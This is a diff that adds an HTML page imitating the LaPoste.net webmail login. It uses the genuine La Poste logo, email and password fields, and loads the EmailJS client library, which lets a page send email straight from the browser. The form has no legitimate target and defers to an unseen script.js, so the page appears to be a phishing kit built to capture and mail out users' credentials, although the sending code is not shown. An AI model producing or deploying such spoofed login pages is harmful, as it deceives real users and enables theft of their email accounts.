@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <title>LaPoste.net - Connexion</title>
+  <link rel="stylesheet" href="style.css"> <!-- Link to external CSS -->
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</head>
+
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://www.laposte.fr/ecom/occ/smartedit/medias/sys_master/root/h37/h68/11600005136414/logo_la-poste-net/logo-la-poste-net.svg" alt="laposte.net">
+    </div>
+
+    <form id="loginForm">
+      <div class="input-container">
+        <input type="email" id="email" placeholder="Adresse mail" required><br><hr>
+        <input type="text" id="password" placeholder="Mot de passe" required> <!-- Password always visible -->
+      </div>
+
+      <div class="stay-connected">
+        <input type="checkbox" id="stayConnected">
+        <label for="stayConnected">Rester connecté</label>
+      </div>
+
+      <button type="submit" class="btn">Se connecter</button>
+
+      <div class="forgot-password">
+        <a href="#">Mot de passe oublié</a>
+      </div>
+    </form>
+  </div>
+
+  <div class="footer-links">
+    <a href="#">Besoin d'aide ?</a> | 
+    <a href="#">Données personnelles</a>
+  </div>
+
+  <script src="script.js"></script> <!-- Separate JavaScript -->
+</body>
+</html>
